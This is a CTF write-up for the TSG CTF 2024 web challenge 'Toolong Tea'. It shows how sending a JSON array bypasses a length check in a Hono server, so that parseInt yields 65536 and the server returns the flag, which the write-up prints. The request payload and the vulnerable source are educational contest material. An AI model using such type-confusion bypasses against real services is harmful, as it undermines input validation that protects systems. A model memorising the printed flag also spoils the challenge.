# Toolong Tea

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 143 solves / 100 points
- Author: @fabon
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Recently it's getting colder in Tokyo which TSG is based in. Would you like to have a cup of hot oolong tea? It will warm up your body.

[http://34.84.32.212:4932](http://34.84.32.212:4932)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216111852.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241214152321.png)

In here, we can submit a number. Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241214152539.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241214152703.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241214152740.png)

When we clicked the "submit" button, it'll send a POST request to `/` with a JSON object:

```json
{
    "num":"123"
}
```

After that, the server respond "Please send 65536".

Let's try to submit number 65536!

```http
POST / HTTP/1.1
Host: 34.84.32.212:4932
Content-Type: application/json
Content-Length: 15

{"num":"65536"}
```

Response:

```http
HTTP/1.1 200 OK
[...]

Too long!
```

Hmm... "Too long!"?

To have a better understanding in this web application, we'll need to read its source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/Web/Toolong-Tea/toolong_tea.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/Toolong-Tea)-[2024.12.14|15:30:58(HKT)]
└> file toolong_tea.tar.gz  
toolong_tea.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 20480
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/Toolong-Tea)-[2024.12.14|15:30:59(HKT)]
└> tar xvzf toolong_tea.tar.gz 
toolong_tea/
toolong_tea/Dockerfile
toolong_tea/compose.yaml
toolong_tea/package-lock.json
toolong_tea/package.json
toolong_tea/public/
toolong_tea/public/index.html
toolong_tea/public/main.js
toolong_tea/server.js
```

After reading the source code a little bit, we can have the following findings:
1. This web application is written in JavaScript with framework [Hono](https://www.npmjs.com/package/hono)
2. The main logic of this web application is in `toolong_tea/server.js`

In `toolong_tea/server.js`, we can see that there's a POST route `/`:

```javascript
import { Hono } from "hono";

const flag = process.env.FLAG ?? "TSGCTF{DUMMY}";

const app = new Hono();
[...]
app.post("/", async (c) => {
    try {
        const { num } = await c.req.json();
        if (num.length === 3 && [...num].every((d) => /\d/.test(d))) {
            const i = parseInt(num, 10);
            if (i === 65536) {
                return c.text(`Congratulations! ${flag}`);
            }
            return c.text("Please send 65536");
        }
        if (num.length > 3) {
            return c.text("Too long!");
        }
        return c.text("Please send 3-digit integer");
    } catch {
        return c.text("Invalid JSON", 500);
    }
});
```

In this route, if our JSON object's attribute `num` length is 3 and its value is all digit, it'll use `parseInt` to parse our string to integer (base 10). **If the parsed integer is `65536`**, it'll return the flag in the JSON response.

With that said, we need to send number `65536` to get the flag.

Wait, how? Isn't this if statement will check our attribute `num`'s length is equal to `3`?

```javascript
const { num } = await c.req.json();
if (num.length === 3 && [...]) {
    [...]
}
```

How can we bypass this?

Well... Since **it doesn't check the attribute `num` to be type string**, we can send the `num` attribute with value of **3 array items** like this:

```json
{
    "num":[
        "123",
        "456",
        "789"
    ]
}
```

By doing so, the `num`'s length is `3`, which bypasses the length check.

Now, here's the question: **Can `parseInt` parse an array?**

Let's try to test that!

```shell
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/Toolong-Tea)-[2024.12.14|15:31:38(HKT)]
└> node                      
[...]
> parseInt(["123", "456", "789"], 10);
123
```

Oh! It can! And it parsed the first item in the array!

## Exploitation

Armed with the above information, we can send the following POST request to get the flag!

```http
POST / HTTP/1.1
Host: 34.84.32.212:4932
Content-Type: application/json
Content-Length: 73

{
    "num":[
        "65536",
        "456",
        "789"
    ]
}
```

Response:

```http
HTTP/1.1 200 OK
[...]

Congratulations! TSGCTF{A_holy_night_with_no_dawn_my_dear...}
```

- **Flag: `TSGCTF{A_holy_night_with_no_dawn_my_dear...}`**

## Conclusion

What we've learned:

1. Bypass validation via missing type checking